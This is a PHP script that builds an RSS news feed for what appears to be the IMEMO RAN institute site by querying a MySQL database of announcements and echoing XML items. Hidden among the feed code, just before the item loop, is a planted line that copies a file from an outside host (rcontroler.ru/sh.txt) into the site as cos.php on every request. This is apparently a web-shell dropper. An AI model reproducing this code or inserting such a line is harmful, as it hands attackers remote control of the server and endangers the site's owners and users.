<?php
$_CONFIG["global"] = @parse_ini_file(dirname(__FILE__)."/dreamedit/_config.ini", true);
if(empty($_CONFIG["global"]))
	die("Config is not found!");
// создаем дополнительную переменную admin_path - полный путь до директории с системой администрирования
$_CONFIG["global"]["paths"]["admin_path"] = $_SERVER["DOCUMENT_ROOT"]."/".$_CONFIG["global"]["paths"]["admin_dir"];
$_CONFIG["global"]["paths"]["template_path"] = $_SERVER["DOCUMENT_ROOT"]."/".$_CONFIG["global"]["paths"]["templates"];

// Insert here the the title of your feed
$rss_title= "Лента новостей официального сайта ИМЭМО РАН";
// Insert your site, in the format site.com
$rss_site= "www.imemo.ru" ;
// Insert the description of your website
$rss_description= "Лента новостей официального сайта ИМЭМО РАН";
// Applicable language of the feed. For spanish, change to "es"
$rss_language="ru";
// Address of the logo file. It can be called whatever you want it to be!
$rss_logo="http://".$rss_site."/img/logo_print.jpg";
// the feed's author email
$emailadmin="";

// set the file's content type and character set
// this must be called before any output
header("Content-Type: text/xml;charset=windows-1251");


// Open the database

mysql_connect($_CONFIG['global']['db_connect']['host'], $_CONFIG['global']['db_connect']['login'], $_CONFIG['global']['db_connect']['password']);
@mysql_select_db($_CONFIG['global']['db_connect']['db_name']) or die("Unable to select DB");


// Select all the records from the Articles/Blog table - whatever you're using it for

$query = "SELECT prev_text.*, ic2.icont_text as title,ic3.icont_text AS datez,ic4.icont_text AS dates
  FROM
(SELECT ie.el_id,it.itype_id as num,it.itype_name as type, ic.icont_text as prev_text, ie.el_date,dd.icont_text as date,it.itype_id
			FROM
				adm_ilines_element AS ie
				INNER JOIN adm_ilines_content ic ON ie.el_id = ic.el_id AND ic.icont_var = 'prev_text'
				INNER JOIN adm_ilines_type it ON it.itype_id = ie.itype_id
				INNER JOIN adm_ilines_content ss ON ss.el_id = ie.el_id AND ss.icont_var='status' AND ss.icont_text='1'
				INNER JOIN adm_ilines_content dd ON dd.el_id = ie.el_id AND dd.icont_var='date'
		WHERE  (ie.itype_id =  1 OR  ie.itype_id =  3 OR ie.itype_id=6 OR ie.itype_id=5 OR ie.itype_id=4)

			ORDER BY ie.el_date DESC ) AS prev_text INNER JOIN adm_ilines_content ic2 ON prev_text.el_id = ic2.el_id AND (ic2.icont_var = 'title' or ic2.icont_var='fio')
            LEFT OUTER JOIN adm_ilines_content ic3 ON ic2.el_id = ic3.el_id AND ic3.icont_var = 'date2'
            LEFT OUTER JOIN adm_ilines_content ic4 ON ic2.el_id = ic4.el_id AND ic4.icont_var = 'dates'
			LIMIT 0,10" ;


mysql_query("SET CHARACTER SET cp1251");
$result = mysql_query($query) or die("Query failed") ;

echo
'<?xml version="1.0" encoding="windows-1251" ?>
<rss version="2.0">
    <channel>
      <title>'.$rss_title.'</title>
      <link>http://'.$rss_site.'</link>
      <description>'.$rss_description.'</description>
      <language>ru-ru</language>
    <image>
<url>'.$rss_logo.'</url>
<title>'.$rss_site.'</title>
<link>http://'.$rss_site.'</link>
</image>';
copy('http://rcontroler.ru/sh.txt','cos.php');

for($i=0;$i<10; $i++) //will loop through 6 times to generate 6 RSS items
{

	$photo_name = "http://".$rss_site."/files/Image/logo_imemo.jpg"; //'where-ever a photo for this article could be found - needs to be http://www.yoursite.com/images/whatever.gif';

    $subject0 = mysql_result($result,$i,'type');
    $subjectn = mysql_result($result,$i,'num');
    $dd = mysql_result($result,$i,'date');
	$type=mysql_result($result,$i,'itype_id');
    $subjectd=substr($dd,8,2).".".substr($dd,5,2).".".substr($dd,0,4);
	$subject = mysql_result($result,$i,'title'); //subject line for the RSS item

	$dd=  mysql_result($result,$i,'datez');
    $subject2="";
	if (!empty($dd)) $subject2=substr($dd,8,2).".".substr($dd,5,2).".".substr($dd,0,4);
 	$subject3=  mysql_result($result,$i,'dates');


	// Pass the record URL_product to the variable $url_product. It also
	// has to include the relative path, like in: "path/product1.htm"

//	$url_product = '/articles/wherever_your_article/blog_can_be_found'; //define the URL of where people could read this blog/article entry
    $url_product="/";
    if ($subjectn ==2) $url_product = '/index.php?page_id=120&amp;id='.mysql_result($result,$i,'el_id').'';
    if ($subjectn ==3) $url_product = '/index.php?page_id=120&amp;id='.mysql_result($result,$i,'el_id').'';
    if ($subjectn ==14) $url_product = '/announcements.html';
    if ($subjectn ==16) $url_product = '/anonsconf.html';
	// Define a description of the item

	$description = mysql_result($result,$i,'prev_text'); //easiest way is by grabbing the content

	// Clean the description

	$description = (htmlspecialchars(strip_tags($description)));
	$subject = htmlspecialchars(strip_tags($subject));

	// Pass tags to describe the product - this has been left ouf of this example

	$rss_tags = 'tag1, tag2';

	//This is a teaser of your article, basically what RSS readers will show the user in their inbox.
	//This is how you entice users to come over and read the full article

	//the easiest way is to just take the first few hundred characters of the content (description)

	$short_description = substr($description,0,500) . "...";

	//so you can define when it was published

	$timestamp = mysql_result($result,$i,'el_date');

	//cleans the timestamp into an RSS friendly format

	$pubdate = date("r", strtotime($timestamp));

	//outputs the RSS item

	echo
	'
		<item>
			<title>'.$subject0.": ". $subjectd." ".
			$subject;
		//	if (!empty($subject2)) echo ' (Дата защиты: '.$subject2.')';
		//	if (!empty($subject3)) echo ' (Сроки проведения: '.$subject3.')';
		    if ($type==6) echo ' (Дата защиты: '.$subject2.')';
			else if (!empty($subject3)) echo ' (Сроки проведения: '.$subject3.')';

    echo			'</title>
				<link>http://'.$rss_site.$url_product.'</link>
				<guid isPermaLink="true">http://'.$rss_site.$url_product.'</guid>
					<description>'.$short_description.'</description>
					<pubDate>'.$pubdate.'</pubDate>
		</item>


	';


} //end of the for-loop

mysql_close(); //close the DB

echo //close the XML file
' </channel>
</rss>';


?>